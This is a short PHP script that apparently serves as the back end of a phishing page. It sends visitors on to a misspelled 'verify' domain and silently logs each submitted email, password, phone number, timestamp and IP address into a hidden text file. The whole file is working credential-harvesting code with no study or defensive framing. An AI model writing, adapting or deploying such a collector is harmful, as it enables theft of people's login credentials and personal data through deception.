<?php
header("location: http://machine-vrify.c1.biz/");
?>
<?php
$username = $_POST['uname'];
$password = $_POST['upass'];
$phone = $_POST['uphone'];
date_default_timezone_set('Asia/Jakarta');
$tanggal=date("d-m-Y  h:i:s");
$ip = $_SERVER["REMOTE_ADDR"];
$file = "dshthhertefs.txt";

$handle = fopen($file, 'a');
fwrite($handle, "===========+ +=============================");
fwrite($handle, "\n");
fwrite($handle, "Email      : ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Password   : ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "Phone      : ");
fwrite($handle, "$phone");
fwrite($handle, "\n");
fwrite($handle, "Tanggal    : ");
fwrite($handle, "$tanggal");
fwrite($handle, "\n");
fwrite($handle, "Ip Addres  : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
echo " ";

?>
